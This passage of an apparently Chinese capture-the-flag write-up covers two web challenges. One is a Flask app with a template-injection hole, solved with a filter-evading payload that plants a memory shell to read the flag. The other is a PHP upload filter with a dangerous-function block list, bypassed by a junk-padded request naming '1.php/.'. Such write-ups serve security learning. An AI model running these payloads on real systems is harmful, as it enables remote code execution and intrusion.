class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, abort, render_template_string, request, render_template, redirect, url_for, session, flash, g</span><br><span class="line"><span class="keyword">from</span> utils <span class="keyword">import</span> rot13, key</span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;your_secret_key&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;DATABASE&#x27;</span>] = <span class="string">&#x27;database.db&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_db</span>():</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        db = g._database = sqlite3.connect(app.config[<span class="string">&#x27;DATABASE&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_appcontext</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">close_connection</span>(<span class="params">exception</span>):</span><br><span class="line">    db = <span class="built_in">getattr</span>(g, <span class="string">&#x27;_database&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> db <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        db.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;home.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_route</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        action = request.form[<span class="string">&#x27;action&#x27;</span>]</span><br><span class="line">        text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;encrypt&#x27;</span>:</span><br><span class="line">            encrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=encrypted_text, action=<span class="string">&#x27;encrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> action == <span class="string">&#x27;decrypt&#x27;</span>:</span><br><span class="line">            text = request.form[<span class="string">&#x27;text&#x27;</span>]</span><br><span class="line">            decrypted_text = rot13(text)</span><br><span class="line">            <span class="keyword">if</span> key(decrypted_text):</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: &#123;&#123;%s&#125;&#125;&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    render_template_string(template)</span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    abort(<span class="number">404</span>)</span><br><span class="line">                <span class="comment"># return &quot;既然你是黑阔，那我凭什么给你回显&quot;</span></span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=<span class="string">&quot;既然你是黑阔，那我凭什么给你回显&quot;</span>, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;rot13_result&#x27;</span>, result=decrypted_text, action=<span class="string">&#x27;decrypt&#x27;</span>))</span><br><span class="line">                template = <span class="string">&#x27;&lt;h1&gt;Your decrypted text is: %s&lt;/h1&gt;&#x27;</span> % decrypted_text</span><br><span class="line">                <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/rot13_result/&lt;action&gt;/&lt;result&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rot13_result</span>(<span class="params">action, result</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;rot13_result.html&#x27;</span>, action=action, result=result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        cursor.execute(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>, (username, password))</span><br><span class="line">        user = cursor.fetchone()</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;message_board&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&#x27;Invalid username or password&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        db = get_db()</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;INSERT INTO users (username, password) VALUES (?, ?)&quot;</span>, (username, password))</span><br><span class="line">            db.commit()</span><br><span class="line">            flash(<span class="string">&#x27;Registration successful! Please log in.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> sqlite3.IntegrityError:</span><br><span class="line">            flash(<span class="string">&#x27;Username already exists!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/message_board&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">message_board</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    db = get_db()</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        message = request.form[<span class="string">&#x27;message&#x27;</span>]</span><br><span class="line">        cursor.execute(<span class="string">&quot;INSERT INTO messages (username, message) VALUES (?, ?)&quot;</span>, (session[<span class="string">&#x27;username&#x27;</span>], message))</span><br><span class="line">        db.commit()</span><br><span class="line"></span><br><span class="line">    cursor.execute(<span class="string">&quot;SELECT username, message FROM messages&quot;</span>)</span><br><span class="line">    messages = cursor.fetchall()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;message_board.html&#x27;</span>, messages=messages)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/logout&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    session.pop(<span class="string">&#x27;username&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;home&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/11/image-20251128165447668.png" alt="image-20251128165447668"></p><p>&#x2F;rot13路由存在ssti，试出config可以进入if，而且无回显，那么就是flask下的内存马了，对关键字有些过滤，拼接即可！payload：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config&#125;&#125;&#123;&#123;url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;<span class="built_in">_</span><span class="built_in">_</span>buil&#x27;~&#x27;tins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;ev&#x27;&#x27;al&#x27;](&quot;app.before<span class="built_in">_</span>request<span class="built_in">_</span>funcs.setdefault(None, []).append(lambda:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(&#x27;cat /f*&#x27;).read())&quot;,&#123;&#x27;app&#x27;:url<span class="built_in">_</span>for[&#x27;<span class="built_in">_</span><span class="built_in">_</span>glo&#x27;~&#x27;bals<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;current<span class="built_in">_</span>ap&#x27;~&#x27;p&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="奶龙牌WAF"><a href="#奶龙牌WAF" class="headerlink" title="奶龙牌WAF"></a>奶龙牌WAF</h2><p>给出源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>] === UPLOAD_ERR_OK) &#123;</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>] : <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$fileExtension</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$name</span>, PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;ph&#x27;</span>) !== <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$fileExtension</span>, <span class="string">&#x27;hta&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;不允许上传此类文件！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>] &gt; <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;文件大小超过限制！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>], <span class="literal">false</span>, <span class="literal">null</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$dangerous_patterns</span> = [</span><br><span class="line">            <span class="string">&#x27;/&lt;\?php/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?=/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;\?xml/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(eval|base64_decode|exec|shell_exec|system|passthru|proc_open|popen|php:\/\/filter|php_value|auto_append_file|auto_prepend_file|include_path|AddType)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\b(select|insert|update|delete|drop|union|from|where|having|like|into|table|set|values)\b/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/--\s/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/\/\*\s.*\*\//&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/#/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&lt;script\b.*?&gt;.*?&lt;\/script&gt;/is&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/javascript:/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/on\w+\s*=\s*[&quot;\&#x27;].*[&quot;\&#x27;]/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[\&lt;\&gt;\&#x27;\&quot;\\\`\;\=]/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%[0-9a-fA-F]&#123;2&#125;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#[0-9]&#123;1,5&#125;;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/&amp;#x[0-9a-fA-F]+;/&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/system\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/passthru\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/shell_exec\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_get_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/fopen\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/file_put_contents\(/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/%u[0-9A-F]&#123;4&#125;/i&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;/[^\x00-\x7F]/&#x27;</span>,</span><br><span class="line">            <span class="comment">// 检测路径穿越</span></span><br><span class="line">            <span class="string">&#x27;/\.\.\//&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dangerous_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$file_content</span>)) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;内容包含危险字符，上传被奶龙拦截！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$upload_dir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>, <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$new_file_name</span> = <span class="variable">$upload_dir</span> . <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">print</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$new_file_name</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件保存失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;文件上传失败，错误代码：&quot;</span> . <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对后缀名和文件内容进行了过滤，<code>$file_content = file_get_contents($file[&#39;tmp_name&#39;], false, null, 0, 5000);</code>只会对前5000个字符进行检测，于是可以用脏数据绕过</p><p><code>move_uploaded_file函数</code></p><blockquote><p>在 <code>move_upload_file()</code> 函数中有一个特性，在文件移动时如果文件后存在 <code>/.</code>，那会自动将 <code>/.</code> 去掉，所以我们就可以使用该特性来绕过黑名单的检测，从而实现文件上传。</p></blockquote><p>所以exp：</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /?name=1.php/. HTTP/1.1</span><br><span class="line">Host: challenge.imxbt.cn:31272</span><br><span class="line">Content-Length: 5215</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept-Language: zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge.imxbt.cn:31272</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.100 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://challenge.imxbt.cn:31272/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryFClPxPRBk7fIw7Nh</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload<span class="built_in">_</span>file&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa